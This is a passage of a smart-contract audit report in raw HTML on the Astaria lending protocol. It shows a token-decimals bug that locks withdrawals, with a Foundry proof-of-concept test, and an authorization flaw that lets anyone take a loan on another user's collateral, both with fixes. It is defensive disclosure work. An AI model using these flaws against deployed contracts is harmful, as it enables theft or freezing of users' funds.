for the vault would have less then 18 decimals, then after liquidation there would be no way to process epoch, because <code>claim</code> function in <code>WithdrawProxy.sol</code> would revert, this would lock all user out of their funds both in vault and in withdraw proxy. Alternatively, if there is more then 18 decimals, claim would leave much less funds than needed for withdraw, resulting in withdrawers losing funds.</p>\n<p>To make report more concise, I would focus on tokens with less then 18 decimals, because they are much more frequent. For example, WBTC have 8 decimals and most stablecoins have 6.</p>\n<h3 id=\"why-is-this-happening\" style=\"position:relative;\"><a href=\"#why-is-this-happening\" aria-label=\"why is this happening permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Why is this happening</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L316\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L316</a><br>\nthis part making sure that withdraw ratio are always stored in 1e18 scale.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L271-L274\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L271-L274</a><br>\nbut here, we are not transforming it into token decimals scale. <code>transferAmount</code> would be orders of magnitudes larger than balance </p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L277\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L277</a><br>\nthen, here we would have underflow of <code>balance</code> value</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281</a><br>\nand finally, here function would revert.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L156\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L156</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L299\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L299</a><br>\nbecause <code>PublicVault.sol</code> need <code>claim</code> to proccess epoch, and <code>WithdrawProxy.sol</code> unlocks funds only after <code>claim</code>, it will result in deadlock of the whole system.</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>First, creating token with 8 decimals:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract Token8Decimals is ERC20{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">constructor() ERC20(&quot;TEST&quot;, &quot;TEST&quot;, 8) {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function mint(address to, uint amount) public{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _mint(to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Second, I changed <code>_bid</code> function in <code>TestHelpers.t.sol</code> contract, so it could take token address as a last parameter, and use it instead of WETH.</p>\n<p>Then, here is modified “testLiquidation5050Split” test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function testLiquidation5050Split() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">TestNFT nft = new TestNFT(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_mintNoDepositApproveRouter(address(nft), 5);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address tokenContract = address(nft);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 tokenId = uint256(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Token8Decimals token = new Token8Decimals();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// create a PublicVault with a 14-day epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vm.startPrank(strategistOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">//bps</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">address publicVault = (ASTARIA_ROUTER.newPublicVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  14 days,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  strategistTwo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address(token),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256(0),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  false,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  new address[](0),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint amountToLend = 10**8 * 1000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">token.mint(address(1), amountToLend);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vm.startPrank(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">token.approve(address(TRANSFER_PROXY), amountToLend);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ASTARIA_ROUTER.depositToVault(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  IERC4626(publicVault),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  address(1),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  amountToLend,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint256(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">ILienToken.Details memory lien = standardLienDetails;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">lien.liquidationInitialAsk = amountToLend*2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">(, ILienToken.Stack[] memory stack1) = _commitToLien({</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  vault: publicVault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  strategist: strategistOne,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  strategistPK: strategistOnePK,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  tokenContract: tokenContract,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  tokenId: tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lienDetails: lien,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  amount: amountToLend/4,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  isFirstLien: true</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 collateralId = tokenContract.computeId(tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_signalWithdraw(address(1), publicVault);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">WithdrawProxy withdrawProxy = PublicVault(publicVault).getWithdrawProxy(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  PublicVault(publicVault).getCurrentEpoch()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">skip(14 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">OrderParameters memory listedOrder1 = ASTARIA_ROUTER.liquidate(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  stack1,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  uint8(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">token.mint(bidder, amountToLend);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_bid(Bidder(bidder, bidderPK), listedOrder1, amountToLend/2, address(token));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">vm.warp(withdrawProxy.getFinalAuctionEnd());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">emit log_named_uint(&quot;finalAuctionEnd&quot;, block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">PublicVault(publicVault).processEpoch();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">skip(13 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">withdrawProxy.claim();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><code>withdrawProxy.claim();</code> at the last line would revert</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L273\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L273</a><br>\nChange this line to <code>10**18</code></p>\n<h3 id=\"severity\" style=\"position:relative;\"><a href=\"#severity\" aria-label=\"severity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity</h3>\n<p>I think this is high risk, because</p>\n<ol>\n<li>There are high demand for stablecoin denominated vaults, and Astaria are designed to support that.</li>\n<li>This bug is sneaky, there could be many epochs before first liquidation that would trigger the deadlock.</li>\n<li>ALL funds would be lost, which is catastrophic.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/482#event-8369726739\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#482</code></a></strong></p>\n<hr>\n<h2 id=\"h-21-attacker-can-take-loan-for-victim\" style=\"position:relative;\"><a href=\"#h-21-attacker-can-take-loan-for-victim\" aria-label=\"h 21 attacker can take loan for victim permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/19\">[H-21] Attacker can take loan for Victim</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/19\">csanuragjain</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/565\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/466\">cergyk</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/428\">evan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/414\">7siech</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/292\">obront</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/275\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/214\">Koolex</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/194\">unforgiven</a></em></p>\n<p>An unapproved, non-owner of collateral can still take loan for the owner/operator of collateral even when owner did not needed any loan. This is happening due to incorrect checks as shown in POC. This leads to unintended loan and associated fees for users.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>A new loan is originated via <code>commitToLien</code> function by User X. Params used by User X are as below:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">collateralId = params.tokenContract.computeId(params.tokenId) = 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">CT.ownerOf(1) = User Y</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">CT.getApproved(1) = User Z</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">CT.isApprovedForAll(User Y, User X) = false</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">receiver = User Y</span></span></code></pre>\n<ol start=\"2\">\n<li>This internally make call to <code>_requestLienAndIssuePayout</code> which then calls <code>_validateCommitment</code> function for signature verification</li>\n<li>Lets see the signature verification part in <code>_validateCommitment</code> function</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">      function _validateCommitment(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IAstariaRouter.Commitment calldata params,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address receiver</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 collateralId = params.tokenContract.computeId(params.tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address holder = CT.ownerOf(collateralId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator = CT.getApproved(collateralId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          msg.sender != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          receiver != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          receiver != operator &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          !CT.isApprovedForAll(holder, msg.sender)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        VIData storage s = _loadVISlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address recovered = ecrecover(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _encodeStrategyData(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              s,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              params.lienRequest.strategy,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              params.lienRequest.merkle.root</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          ),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          params.lienRequest.v,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          params.lienRequest.r,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          params.lienRequest.s</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          (recovered != owner() &amp;&amp; recovered != s.delegate) ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          recovered == address(0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert IVaultImplementation.InvalidRequest(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            InvalidRequestReason.INVALID_SIGNATURE</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span></code></pre>\n<ol start=\"4\">\n<li>Ideally the verification should fail since :</li>\n</ol>\n<p>a. User X is not owner of passed collateral<br>\nb. User X is not approved for this collateral<br>\nc. User X is not approved for all of User Y token</p>\n<ol start=\"5\">\n<li>But observe the below if condition doing the required check:</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 collateralId = params.tokenContract.computeId(params.tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address holder = CT.ownerOf(collateralId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address operator = CT.getApproved(collateralId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          msg.sender != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          receiver != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          receiver != operator &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          !CT.isApprovedForAll(holder, msg.sender)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<ol start=\"6\">\n<li>In our case this if condition does not execute since receiver = holder</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          msg.sender != holder &amp;&amp; // true since User X is not the owner</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          receiver != holder &amp;&amp; // false since attacker passed receiver as User Y which is owner of collateral, thus failing this if condition </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          receiver != operator &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          !CT.isApprovedForAll(holder, msg.sender)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span></code></pre>\n<ol start=\"7\">\n<li>This means the signature verification passes and loan is issued for collateral owner without his wish</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Revise the condition as shown below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      msg.sender != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      msg.sender != operator &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      !CT.isApprovedForAll(holder, msg.sender)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if (</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      receiver != holder &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      receiver != operator </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/565#event-8369712722\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#565</code></a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-34\" style=\"position:relative;\"><a href=\"#medium-risk-findings-34\" aria-label=\"medium risk findings 34 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (34)</h1>\n<h2 id=\"m-01-a-user-can-use-the-same-proof-for-a-commitment-more-than-1-time\" style=\"position:relative;\"><a href=\"#m-01-a-user-can-use-the-same-proof-for-a-commitment-more-than-1-time\" aria-label=\"m 01 a user can use the same proof for a commitment more than 1 time permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 